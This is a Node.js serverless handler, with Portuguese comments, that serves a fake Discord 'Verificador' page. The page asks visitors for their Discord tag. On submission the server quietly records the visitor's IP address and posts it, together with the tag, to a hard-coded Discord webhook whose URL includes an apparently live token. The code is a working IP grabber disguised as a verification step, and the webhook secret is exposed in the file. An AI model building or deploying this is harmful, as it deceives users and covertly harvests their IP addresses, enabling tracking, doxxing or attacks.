import fetch from "node-fetch";

// Seu webhook do Discord
const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1405711116704808980/cRwHx7JatPmjxHROD9ktgYmMoTXDnHJnys92cMU0ODuKmpBb4-_sXT1bDch8GQBdVFP1";

export default async function handler(req, res) {
  if (req.method === "GET") {
    // Serve o HTML diretamente
    const html = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificador</title>
<style>
body {margin:0; font-family: Arial, sans-serif; background: url('https://i.ibb.co/Zh5q0nC/red-black-bg.jpg') no-repeat center center/cover; height:100vh; color:white; display:flex; justify-content:center; align-items:center; overflow:hidden;}
#particles-js {position:absolute; width:100%; height:100%; z-index:0;}
.container {z-index:2; text-align:center; background: rgba(0,0,0,0.5); padding:30px; border-radius:15px; animation:fadeIn 1.5s ease-in-out;}
.title { font-size:2em; color:red; margin-bottom:10px;}
.subtitle { margin-bottom:20px;}
input { padding:10px; border:none; border-radius:5px; width:250px; margin-bottom:10px;}
button { padding:10px 20px; background:red; border:none; border-radius:5px; cursor:pointer; color:white; font-weight:bold; transition:background 0.3s;}
button:hover { background:darkred;}
#status { margin-top:10px;}
@keyframes fadeIn { from {opacity:0; transform:translateY(20px);} to {opacity:1; transform:translateY(0);} }
</style>
</head>
<body>
<div id="particles-js"></div>
<div class="container">
<h1 class="title">🔍 Verificador</h1>
<p class="subtitle">Digite seu @ do Discord para continuar</p>
<input type="text" id="discordTag" placeholder="@Usuario#0000">
<button onclick="enviar()">Verificar</button>
<p id="status"></p>
</div>
<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
<script>
particlesJS("particles-js", {
  "particles": {
    "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
    "color": { "value": "#ff0000" },
    "shape": { "type": "circle" },
    "opacity": { "value": 0.5, "random": true },
    "size": { "value": 3, "random": true },
    "line_linked": { "enable": true, "distance": 150, "color": "#ff0000", "opacity": 0.4, "width": 1 },
    "move": { "enable": true, "speed": 3, "direction": "none", "straight": false, "out_mode": "out" }
  },
  "interactivity": {
    "detect_on": "canvas",
    "events": { "onhover": { "enable": true, "mode": "repulse" }, "onclick": { "enable": true, "mode": "push" } },
    "modes": { "repulse": { "distance": 100 }, "push": { "particles_nb": 4 } }
  },
  "retina_detect": true
});

async function enviar() {
  const discordTag = document.getElementById('discordTag').value.trim();
  const statusEl = document.getElementById('status');
  if (!discordTag) {
    statusEl.textContent = '⚠️ Digite seu @ do Discord';
    statusEl.style.color = 'yellow';
    return;
  }
  try {
    const resposta = await fetch(window.location.href, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ discordTag })
    });
    const resultado = await resposta.json();
    if (resultado.success) {
      statusEl.textContent = '✅ Verificação enviada com sucesso!';
      statusEl.style.color = 'lightgreen';
    } else {
      statusEl.textContent = '❌ Erro ao enviar!';
      statusEl.style.color = 'red';
    }
  } catch (err) {
    console.error(err);
    statusEl.textContent = '❌ Erro de conexão!';
    statusEl.style.color = 'red';
  }
}
</script>
</body>
</html>
    `;
    res.setHeader("Content-Type", "text/html");
    res.status(200).send(html);
  }

  // POST para enviar os dados para o webhook
  if (req.method === "POST") {
    const { discordTag } = req.body;
    if (!discordTag) return res.status(400).json({ error: "Campo @ do Discord é obrigatório" });

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const payload = {
      content: `📥 **Novo envio**\n💻 IP: \`${ip}\`\n🏷 Discord: \`${discordTag}\`\n🕒 Horário: <t:${Math.floor(Date.now()/1000)}:F>`
    };

    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      res.status(200).json({ success: true });
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: "Erro ao enviar para o webhook" });
    }
  }
}
